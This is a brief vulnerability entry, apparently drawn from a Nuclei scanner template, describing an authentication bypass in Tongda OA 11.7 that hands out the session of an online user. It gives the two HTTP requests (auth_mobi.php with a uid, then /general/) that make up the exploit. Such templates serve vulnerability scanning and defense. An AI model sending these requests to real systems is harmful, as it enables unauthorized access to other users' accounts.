# Vulnerability: Tongda OA 11.7 - Authentication Bypass
**Classification:** TONGDA
**Source:** Nuclei Template (`tongda-auth-bypass.yaml`)

## Description
Tongda OA is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., LTD v11.7 has the interface query online user function, when the user is online, it will return PHPSESSION so that it can log in to the background system.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /mobile/auth_mobi.php?isAvatar=1&uid={{uid}}&P_VER=0 HTTP/1.1
Host: {{Hostname}}

GET /general/ HTTP/1.1
Host: {{Hostname}}
```

